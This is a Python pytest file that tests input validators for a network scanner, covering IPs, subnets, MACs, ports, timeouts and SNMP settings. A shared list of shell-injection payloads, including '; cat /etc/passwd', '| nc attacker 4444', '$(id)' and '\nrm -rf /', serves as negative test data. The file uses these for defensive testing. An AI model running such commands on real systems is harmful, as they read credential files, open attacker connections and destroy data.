"""Unit tests for the security input validators.

Covers positive, boundary, negative, and shell-meta injection cases for
all five validators defined in ``otalon-scan/src/otalon_scan/core/validators.py``.
"""

from __future__ import annotations

import ipaddress
from typing import Any

import psutil
import pytest

from otalon_scan.core.validators import (
    validate_hard_timeout_s,
    validate_host_timeout_ms,
    validate_network_interface,
    validate_operation_timeout,
    validate_port_range,
    validate_retry_attempts,
    validate_snmp_communities,
    validate_target_ip,
    validate_target_mac,
    validate_target_subnet,
    validate_timing_template,
)

# Shell-meta injection matrix shared across all validators that accept strings.
INJECTION_STRINGS: list[str] = [
    "; cat /etc/passwd",
    "&& whoami",
    "| nc attacker 4444",
    "`id`",
    "$(id)",
    "\nrm -rf /",
    "\x00uname",
]


# ---------------------------------------------------------------------------
# validate_network_interface
# ---------------------------------------------------------------------------


def _existing_interface() -> str:
    """Return one interface that is known to exist on the host."""
    interfaces = list(psutil.net_if_addrs().keys())
    assert interfaces, "host has no network interfaces; cannot run this test"
    return str(interfaces[0])


def test_validate_network_interface_accepts_existing() -> None:
    iface = _existing_interface()
    assert validate_network_interface(iface) == iface


def test_validate_network_interface_rejects_unknown() -> None:
    with pytest.raises(ValueError, match="not present on host"):
        validate_network_interface("definitely_not_an_interface_zzz_42")


def test_validate_network_interface_rejects_empty_string() -> None:
    with pytest.raises(ValueError):
        validate_network_interface("")


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_validate_network_interface_rejects_shell_meta(payload: str) -> None:
    iface = _existing_interface()
    with pytest.raises(ValueError):
        validate_network_interface(iface + payload)


@pytest.mark.parametrize("non_str", [None, 42, 1.5, ["eth0"], {"iface": "eth0"}, True])
def test_validate_network_interface_rejects_non_string(non_str: Any) -> None:
    with pytest.raises(ValueError, match="must be a string"):
        validate_network_interface(non_str)


# ---------------------------------------------------------------------------
# validate_target_subnet
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "value,expected",
    [
        ("10.0.0.0/24", "10.0.0.0/24"),
        ("192.168.1.0/24", "192.168.1.0/24"),
        ("0.0.0.0/0", "0.0.0.0/0"),
        ("255.255.255.255/32", "255.255.255.255/32"),
        ("10.0.0.5/24", "10.0.0.0/24"),  # host bits tolerated via strict=False
        ("2001:db8::/32", "2001:db8::/32"),
        ("::/0", "::/0"),
        ("fe80::1/64", "fe80::/64"),
    ],
)
def test_validate_target_subnet_accepts(value: str, expected: str) -> None:
    assert validate_target_subnet(value) == expected


def test_validate_target_subnet_canonical_form_matches_ipaddress() -> None:
    raw = "10.0.0.0/24"
    assert validate_target_subnet(raw) == str(ipaddress.ip_network(raw, strict=False))


@pytest.mark.parametrize(
    "bad",
    [
        "",
        "not-a-subnet",
        "10.0.0.0",  # missing mask is actually accepted by ip_network; covered separately
        "999.999.999.999/24",
        "10.0.0.0/33",
        "10.0.0.0/-1",
    ],
)
def test_validate_target_subnet_rejects_malformed(bad: str) -> None:
    # "10.0.0.0" without a mask is treated by ipaddress as /32; exclude from negative set.
    if bad == "10.0.0.0":
        assert validate_target_subnet(bad) == "10.0.0.0/32"
        return
    with pytest.raises(ValueError):
        validate_target_subnet(bad)


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_validate_target_subnet_rejects_shell_meta(payload: str) -> None:
    with pytest.raises(ValueError):
        validate_target_subnet(f"10.0.0.0/24{payload}")


@pytest.mark.parametrize("non_str", [None, 24, 10.0, ["10.0.0.0/24"]])
def test_validate_target_subnet_rejects_non_string(non_str: Any) -> None:
    with pytest.raises(ValueError, match="must be a string"):
        validate_target_subnet(non_str)


# ---------------------------------------------------------------------------
# validate_target_ip
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "value,expected",
    [
        ("192.168.1.10", "192.168.1.10"),
        ("0.0.0.0", "0.0.0.0"),
        ("255.255.255.255", "255.255.255.255"),
        ("::1", "::1"),
        ("2001:db8::1", "2001:db8::1"),
        ("fe80::1", "fe80::1"),
    ],
)
def test_validate_target_ip_accepts(value: str, expected: str) -> None:
    assert validate_target_ip(value) == expected


@pytest.mark.parametrize(
    "bad",
    [
        "",
        "not-an-ip",
        "999.0.0.1",
        "192.168.1",
        "192.168.1.1/24",  # network, not address
        "::g",
    ],
)
def test_validate_target_ip_rejects_malformed(bad: str) -> None:
    with pytest.raises(ValueError):
        validate_target_ip(bad)


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_validate_target_ip_rejects_shell_meta(payload: str) -> None:
    with pytest.raises(ValueError):
        validate_target_ip(f"192.168.1.10{payload}")


@pytest.mark.parametrize("non_str", [None, 1, 1.5, ["192.168.1.1"]])
def test_validate_target_ip_rejects_non_string(non_str: Any) -> None:
    with pytest.raises(ValueError, match="must be a string"):
        validate_target_ip(non_str)


# ---------------------------------------------------------------------------
# validate_target_mac (P8 Welle E / F-11)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "value,expected",
    [
        ("aa:bb:cc:dd:ee:ff", "aa:bb:cc:dd:ee:ff"),
        ("AA:BB:CC:DD:EE:FF", "aa:bb:cc:dd:ee:ff"),
        ("aa-bb-cc-dd-ee-ff", "aa:bb:cc:dd:ee:ff"),
        ("aabb.ccdd.eeff", "aa:bb:cc:dd:ee:ff"),
        ("aabbccddeeff", "aa:bb:cc:dd:ee:ff"),
    ],
)
def test_validate_target_mac_accepts_and_canonicalises(value: str, expected: str) -> None:
    assert validate_target_mac(value) == expected


@pytest.mark.parametrize(
    "bad",
    [
        "",
        "not-a-mac",
        "aa:bb:cc:dd:ee",  # too few octets
        "aa:bb:cc:dd:ee:ff:00",  # too many octets
        "zz:bb:cc:dd:ee:ff",  # non-hex
    ],
)
def test_validate_target_mac_rejects_malformed(bad: str) -> None:
    with pytest.raises(ValueError):
        validate_target_mac(bad)


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_validate_target_mac_rejects_shell_meta(payload: str) -> None:
    with pytest.raises(ValueError):
        validate_target_mac(f"aa:bb:cc:dd:ee:ff{payload}")


@pytest.mark.parametrize("non_str", [None, 1, 1.5, ["aa:bb:cc:dd:ee:ff"]])
def test_validate_target_mac_rejects_non_string(non_str: Any) -> None:
    with pytest.raises(ValueError, match="must be a string"):
        validate_target_mac(non_str)


# ---------------------------------------------------------------------------
# validate_port_range
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "value",
    [
        "22",
        "1",
        "65535",
        "1-65535",
        "22,80,443",
        "1-1024",
        "22,80,1000-2000",
        "1-100,200-300,400",
    ],
)
def test_validate_port_range_accepts(value: str) -> None:
    assert validate_port_range(value) == value


@pytest.mark.parametrize(
    "bad",
    [
        "",
        "0",  # below range
        "65536",  # above range
        "1-65536",
        "0-100",
        "100-50",  # descending
        "abc",
        "22,",
        ",22",
        "22-",
        "-22",
        "22--80",
        "22 80",
        "22;80",
    ],
)
def test_validate_port_range_rejects(bad: str) -> None:
    with pytest.raises(ValueError):
        validate_port_range(bad)


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_validate_port_range_rejects_shell_meta(payload: str) -> None:
    with pytest.raises(ValueError):
        validate_port_range(f"22{payload}")


@pytest.mark.parametrize("non_str", [None, 22, [22], 22.0])
def test_validate_port_range_rejects_non_string(non_str: Any) -> None:
    with pytest.raises(ValueError, match="must be a string"):
        validate_port_range(non_str)


def test_validate_port_range_boundary_low() -> None:
    assert validate_port_range("1") == "1"


def test_validate_port_range_boundary_high() -> None:
    assert validate_port_range("65535") == "65535"


def test_validate_port_range_boundary_full() -> None:
    assert validate_port_range("1-65535") == "1-65535"


def test_validate_port_range_equal_low_high_ok() -> None:
    assert validate_port_range("100-100") == "100-100"


_ICS_PRESET = (
    "1-1024,1089-1091,1105,1200,1911,1962,2222,2404,2455,4000,4840,4843,"
    "4911,5007,5094,9600,10000,11740,11741,18245,19999,20000,20256,20547,"
    "34962-34964,34980,44818,46823,46824,47808,55000-55003"
)


def test_validate_port_range_accepts_ics_preset() -> None:
    """The ICS-aware default port range SHALL pass validation."""
    assert validate_port_range(_ICS_PRESET) == _ICS_PRESET


# ---------------------------------------------------------------------------
# validate_timing_template
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("value", ["0", "1", "2", "3", "4", "5"])
def test_validate_timing_template_accepts(value: str) -> None:
    assert validate_timing_template(value) == value


@pytest.mark.parametrize(
    "bad",
    [
        "",
        "6",
        "9",
        "-1",
        "10",
        "T4",
        " 4",
        "4 ",
        "4.0",
        "four",
    ],
)
def test_validate_timing_template_rejects(bad: str) -> None:
    with pytest.raises(ValueError):
        validate_timing_template(bad)


@pytest.mark.parametrize("payload", INJECTION_STRINGS)
def test_validate_timing_template_rejects_shell_meta(payload: str) -> None:
    with pytest.raises(ValueError):
        validate_timing_template(f"4{payload}")


@pytest.mark.parametrize("non_str", [None, 4, 4.0, [4], True])
def test_validate_timing_template_rejects_non_string(non_str: Any) -> None:
    with pytest.raises(ValueError, match="must be a string"):
        validate_timing_template(non_str)


# ---------------------------------------------------------------------------
# validate_host_timeout_ms / validate_hard_timeout_s (SCAN-003/010)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("value", [100, 5_000, 60_000, 3_600_000])
def test_validate_host_timeout_ms_accepts(value: int) -> None:
    assert validate_host_timeout_ms(value) == value


@pytest.mark.parametrize("value", [0, 99, 3_600_001, -1])
def test_validate_host_timeout_ms_rejects_out_of_range(value: int) -> None:
    with pytest.raises(ValueError, match="out of range"):
        validate_host_timeout_ms(value)


@pytest.mark.parametrize("non_int", [None, "60000", 1.5, [60000], True])
def test_validate_host_timeout_ms_rejects_non_int(non_int: Any) -> None:
    with pytest.raises(ValueError, match="must be an int"):
        validate_host_timeout_ms(non_int)


@pytest.mark.parametrize("value", [1, 120, 3_600])
def test_validate_hard_timeout_s_accepts(value: int) -> None:
    assert validate_hard_timeout_s(value) == value


@pytest.mark.parametrize("value", [0, 3_601, -5])
def test_validate_hard_timeout_s_rejects_out_of_range(value: int) -> None:
    with pytest.raises(ValueError, match="out of range"):
        validate_hard_timeout_s(value)


@pytest.mark.parametrize("non_int", [None, "120", 1.0, [120], False])
def test_validate_hard_timeout_s_rejects_non_int(non_int: Any) -> None:
    with pytest.raises(ValueError, match="must be an int"):
        validate_hard_timeout_s(non_int)


# ---------------------------------------------------------------------------
# validate_operation_timeout / validate_retry_attempts (SCAN-003 snmp)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("value", [1, 30, 600])
def test_validate_operation_timeout_accepts(value: int) -> None:
    assert validate_operation_timeout(value) == value


@pytest.mark.parametrize("value", [0, 601, -1])
def test_validate_operation_timeout_rejects_out_of_range(value: int) -> None:
    with pytest.raises(ValueError, match="out of range"):
        validate_operation_timeout(value)


@pytest.mark.parametrize("non_int", [None, "30", 1.5, [30], True])
def test_validate_operation_timeout_rejects_non_int(non_int: Any) -> None:
    with pytest.raises(ValueError, match="must be an int"):
        validate_operation_timeout(non_int)


@pytest.mark.parametrize("value", [0, 2, 10])
def test_validate_retry_attempts_accepts(value: int) -> None:
    assert validate_retry_attempts(value) == value


@pytest.mark.parametrize("value", [-1, 11, 100])
def test_validate_retry_attempts_rejects_out_of_range(value: int) -> None:
    with pytest.raises(ValueError, match="out of range"):
        validate_retry_attempts(value)


@pytest.mark.parametrize("non_int", [None, "2", 2.0, [2], True])
def test_validate_retry_attempts_rejects_non_int(non_int: Any) -> None:
    with pytest.raises(ValueError, match="must be an int"):
        validate_retry_attempts(non_int)


# ---------------------------------------------------------------------------
# validate_snmp_communities (SCAN-003 snmp)
# ---------------------------------------------------------------------------


def test_validate_snmp_communities_accepts_valid_triples() -> None:
    value = [["192.168.0.0/24", "public", 0], ["10.0.0.0/8", "private", 1]]
    assert validate_snmp_communities(value) == value


def test_validate_snmp_communities_accepts_empty_list() -> None:
    assert validate_snmp_communities([]) == []


@pytest.mark.parametrize(
    "bad",
    [
        "not-a-list",
        42,
        None,
        {"192.168.0.0/24": "public"},
    ],
)
def test_validate_snmp_communities_rejects_non_list(bad: Any) -> None:
    with pytest.raises(ValueError):
        validate_snmp_communities(bad)


@pytest.mark.parametrize(
    "bad_entry",
    [
        ["192.168.0.0/24", "public"],  # too short
        ["192.168.0.0/24", "public", 0, "extra"],  # too long
        "192.168.0.0/24",  # not a sequence triple
    ],
)
def test_validate_snmp_communities_rejects_malformed_triple(bad_entry: Any) -> None:
    with pytest.raises(ValueError, match="triple"):
        validate_snmp_communities([bad_entry])


@pytest.mark.parametrize(
    "bad_cidr",
    [
        "not-a-cidr",
        "999.0.0.0/24",
        "10.0.0.0/33",
        "; rm -rf /",
        "$(id)",
        42,
    ],
)
def test_validate_snmp_communities_rejects_bad_cidr(bad_cidr: Any) -> None:
    with pytest.raises(ValueError):
        validate_snmp_communities([[bad_cidr, "public", 0]])


@pytest.mark.parametrize("bad_community", ["", 42, None, "x" * 129])
def test_validate_snmp_communities_rejects_bad_community(bad_community: Any) -> None:
    with pytest.raises(ValueError, match="community"):
        validate_snmp_communities([["192.168.0.0/24", bad_community, 0]])


@pytest.mark.parametrize("bad_version", [2, -1, "0", 1.0, True, False])
def test_validate_snmp_communities_rejects_bad_version(bad_version: Any) -> None:
    with pytest.raises(ValueError, match="version"):
        validate_snmp_communities([["192.168.0.0/24", "public", bad_version]])
